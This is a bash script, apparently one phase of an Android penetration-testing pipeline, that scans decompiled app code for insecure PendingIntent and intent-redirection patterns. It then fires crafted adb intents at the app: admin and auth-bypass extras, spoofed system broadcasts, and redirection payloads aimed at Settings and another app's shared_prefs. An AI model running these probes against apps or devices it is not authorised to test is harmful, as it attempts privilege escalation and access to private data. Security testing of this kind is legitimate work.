#!/usr/bin/env bash
PIPELINE_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# 12_pending_intent.sh - PendingIntent abuse + Intent redirection deep test
PROFILE_PHASE="12_pending_intent"
source "$PIPELINE_ROOT/lib/common.sh"
source "$PIPELINE_ROOT/lib/findings.sh"

PKG="$(tget apk package_name)"
[ -z "$PKG" ] && { err "No package_name"; exit 1; }

cd "$RUN_DIR" || exit 1
PENDING_DIR="$RUN_DIR/pending_intent"
mkdir -p "$PENDING_DIR"

# ============================================================
# A. Static Analysis — Find PendingIntent Usage
# ============================================================
info "=== A. Static PendingIntent Analysis ==="

JADX_DIR="$RUN_DIR/static/jadx"
if [ -d "$JADX_DIR" ]; then
  info "[step-A1/8] Scanning for PendingIntent creation points"
  grep -rn "PendingIntent.getActivity\|PendingIntent.getService\|PendingIntent.getBroadcast\|PendingIntent.getForegroundService" "$JADX_DIR/sources/" 2>/dev/null > "$PENDING_DIR/creation.txt" || true
  PI_COUNT=$(wc -l < "$PENDING_DIR/creation.txt" 2>/dev/null || echo 0)
  info "  PendingIntent creation points: $PI_COUNT"

  info "[step-A2/8] Scanning for FLAG_MUTABLE (insecure mutable PendingIntents)"
  grep -rn "FLAG_MUTABLE" "$JADX_DIR/sources/" 2>/dev/null > "$PENDING_DIR/flag_mutable.txt" || true
  MUTABLE_COUNT=$(wc -l < "$PENDING_DIR/flag_mutable.txt" 2>/dev/null || echo 0)
  info "  FLAG_MUTABLE instances: $MUTABLE_COUNT"
  if [ "$MUTABLE_COUNT" -gt 0 ]; then
    warn "  $MUTABLE_COUNT FLAG_MUTABLE PendingIntents — other apps can modify the intent"
    head -5 "$PENDING_DIR/flag_mutable.txt" | while IFS= read -r line; do info "    $line"; done
    fadd "$MUTABLE_COUNT FLAG_MUTABLE PendingIntents (insecure)" HIGH HIGH CWE-668 "A04:2021" "$PENDING_DIR/flag_mutable.txt"
  fi

  info "[step-A3/8] Scanning for FLAG_IMMUTABLE (secure)"
  grep -rn "FLAG_IMMUTABLE" "$JADX_DIR/sources/" 2>/dev/null > "$PENDING_DIR/flag_immutable.txt" || true
  IMMUTABLE_COUNT=$(wc -l < "$PENDING_DIR/flag_immutable.txt" 2>/dev/null || echo 0)
  info "  FLAG_IMMUTABLE instances: $IMMUTABLE_COUNT"

  info "[step-A4/8] Scanning for intent redirection patterns"
  grep -rn "getIntent\(\)\.getParcelableExtra\|getIntent\(\).get.*Extra\|Intent.parseUri\|Intent.getIntent" "$JADX_DIR/sources/" 2>/dev/null > "$PENDING_DIR/intent_redirect.txt" || true
  REDIRECT_COUNT=$(wc -l < "$PENDING_DIR/intent_redirect.txt" 2>/dev/null || echo 0)
  info "  Intent redirection patterns: $REDIRECT_COUNT"
  if [ "$REDIRECT_COUNT" -gt 0 ]; then
    warn "  $REDIRECT_COUNT potential intent redirection paths"
    fadd "$REDIRECT_COUNT potential intent redirections" HIGH HIGH CWE-610 "A01:2021" "$PENDING_DIR/intent_redirect.txt"
  fi

  info "[step-A5/8] Scanning for startActivity after getIntent"
  grep -rn -A5 "getIntent\(\)" "$JADX_DIR/sources/" 2>/dev/null | grep -B1 "startActivity\|startService\|sendBroadcast" > "$PENDING_DIR/intent_flow.txt" || true
  FLOW_COUNT=$(wc -l < "$PENDING_DIR/intent_flow.txt" 2>/dev/null || echo 0)
  info "  Intent→Activity/Service/Broadcast flows: $FLOW_COUNT"

  info "[step-A6/8] Scanning for startActivityForResult"
  grep -rn "startActivityForResult" "$JADX_DIR/sources/" 2>/dev/null > "$PENDING_DIR/activity_for_result.txt" || true
  FORRESULT_COUNT=$(wc -l < "$PENDING_DIR/activity_for_result.txt" 2>/dev/null || echo 0)
  info "  startActivityForResult calls: $FORRESULT_COUNT"

  info "[step-A7/8] Scanning for setTargetPackage/setPackage on PendingIntents"
  grep -rn "setTargetPackage\|setPackage" "$JADX_DIR/sources/" 2>/dev/null > "$PENDING_DIR/package_targeting.txt" || true
  TARGETING_COUNT=$(wc -l < "$PENDING_DIR/package_targeting.txt" 2>/dev/null || echo 0)
  info "  Package targeting calls: $TARGETING_COUNT"

  info "[step-A8/8] Scanning for PendingIntent usage in exported components"
  grep -rn "PendingIntent" "$JADX_DIR/sources/" 2>/dev/null | grep -B2 -A2 "exported\|intent-filter" > "$PENDING_DIR/exported_pi.txt" || true
  EXPORTED_PI=$(wc -l < "$PENDING_DIR/exported_pi.txt" 2>/dev/null || echo 0)
  info "  PendingIntent in exported contexts: $EXPORTED_PI"

  ok "  Static: PI=$PI_COUNT, Mutable=$MUTABLE_COUNT, Immutable=$IMMUTABLE_COUNT, Redirect=$REDIRECT_COUNT"
else
  warn "  jadx directory not found; skipping static PendingIntent analysis"
fi

# ============================================================
# B. Dynamic Analysis — PendingIntent Hijacking
# ============================================================
info "=== B. Dynamic PendingIntent Testing ==="

info "[step-B1/3] Testing exported activities with crafted PendingIntents"
EXPORTED=$(adb shell "dumpsys package $PKG" 2>/dev/null | grep -A2 "Activity" | grep -oP '\S+Activity\S*' | sort -u || true)
ACT_COUNT=$(echo "$EXPORTED" | grep -c "Activity" 2>/dev/null || echo 0)
info "  Exported activities found: $ACT_COUNT"

for act in $EXPORTED; do
  info "    Sending FLAG_MUTABLE extra to: $act"
  adb shell "am start -n $PKG/$act --ei android.intent.extra.FLAG 268435456" 2>/dev/null || true
  sleep 1
  info "    Sending boolean extras (require_auth=false, is_admin=true) to: $act"
  adb shell "am start -n $PKG/$act --ez require_auth false --ez is_admin true" 2>/dev/null || true
  sleep 1
done

info "[step-B2/3] Testing broadcast PendingIntents"
info "  Sending BOOT_COMPLETED broadcast to: $PKG/.BootReceiver"
adb shell "am broadcast -a android.intent.action.BOOT_COMPLETED -n $PKG/.BootReceiver" 2>/dev/null || true
info "  Sending PACKAGE_REPLACED broadcast to: $PKG/.PackageReceiver"
adb shell "am broadcast -a android.intent.action.PACKAGE_REPLACED -n $PKG/.PackageReceiver --es android.intent.extra.UID 1000" 2>/dev/null || true

info "[step-B3/3] Testing service PendingIntents"
SERVICES=$(adb shell "dumpsys package $PKG" 2>/dev/null | grep -A2 "Service" | grep -oP '\S+Service\S*' | sort -u || true)
SVC_COUNT=$(echo "$SERVICES" | grep -c "Service" 2>/dev/null || echo 0)
info "  Services found: $SVC_COUNT"
for svc in $SERVICES; do
  info "    Sending intent to service: $svc"
  adb shell "am startservice -n $PKG/$svc --ei priority 999 --ez force true" 2>/dev/null || true
  sleep 1
done

# ============================================================
# C. Intent Redirection Exploitation
# ============================================================
info "=== C. Intent Redirection Exploitation ==="

if [ -s "$PENDING_DIR/intent_redirect.txt" ]; then
  info "[step-C1/2] Extracting classes with intent redirection"
  grep -oP '\w+\.\w+(?=\.)' "$PENDING_DIR/intent_redirect.txt" | sort -u > "$PENDING_DIR/redirect_classes.txt" 2>/dev/null || true
  REDIRECT_CLASSES=$(wc -l < "$PENDING_DIR/redirect_classes.txt" 2>/dev/null || echo 0)
  info "  Classes with intent redirection: $REDIRECT_CLASSES"

  info "[step-C2/2] Sending malicious intents to redirect targets"
  while IFS= read -r cls; do
    info "    Testing redirection in: $cls"
    adb shell "am start -n $PKG/$cls --es android.intent.extra.INTENT 'component:com.android.settings/.Settings'" 2>/dev/null || true
    sleep 1
    adb shell "am start -n $PKG/$cls --es android.intent.extra.INTENT 'action:android.settings.SETTINGS'" 2>/dev/null || true
    sleep 1
    adb shell "am start -n $PKG/$cls --es android.intent.extra.INTENT 'uri:file:///data/data/com.android.settings/shared_prefs'" 2>/dev/null || true
    sleep 1
  done < "$PENDING_DIR/redirect_classes.txt"
else
  info "  No intent redirection patterns found; skipping exploitation"
fi

# ============================================================
# D. FLAG_MUTABLE Analysis
# ============================================================
info "=== D. FLAG_MUTABLE Summary ==="

if [ -s "$PENDING_DIR/flag_mutable.txt" ]; then
  MUTABLE_ONLY=$((PI_COUNT - IMMUTABLE_COUNT))
  if [ "$MUTABLE_ONLY" -gt 0 ]; then
    warn "  $MUTABLE_ONLY PendingIntents are mutable-only (no immutable alternative)"
  else
    info "  All mutable PendingIntents also have immutable alternatives"
  fi
fi

# ============================================================
# E. Content Provider Intent Injection
# ============================================================
info "=== E. Content Provider → Intent Injection ==="

info "[step-E1/1] Querying content providers for intent-triggering data"
PROVIDERS=$(adb shell "dumpsys package $PKG" 2>/dev/null | grep -A2 "Provider" | grep -oP '\S+Provider\S*' | sort -u || true)
PROV_COUNT=$(echo "$PROVIDERS" | grep -c "Provider" 2>/dev/null || echo 0)
info "  Content providers found: $PROV_COUNT"

INTENT_IN_PROVIDER=0
for prov in $PROVIDERS; do
  adb shell "content query --uri content://$PKG.$prov/" 2>/dev/null > "$PENDING_DIR/provider_query_$prov.txt" || true
  if grep -qi "intent\|startActivity\|broadcast\|component" "$PENDING_DIR/provider_query_$prov.txt" 2>/dev/null; then
    warn "  Provider $prov may trigger intents"
    INTENT_IN_PROVIDER=$((INTENT_IN_PROVIDER + 1))
  fi
done
info "  Providers with intent-related data: $INTENT_IN_PROVIDER"

ok "PendingIntent testing complete -> $PENDING_DIR"
ok "  PI=$PI_COUNT, Mutable=$MUTABLE_COUNT, Redirect=$REDIRECT_COUNT, Providers=$PROV_COUNT"
fsnapshot
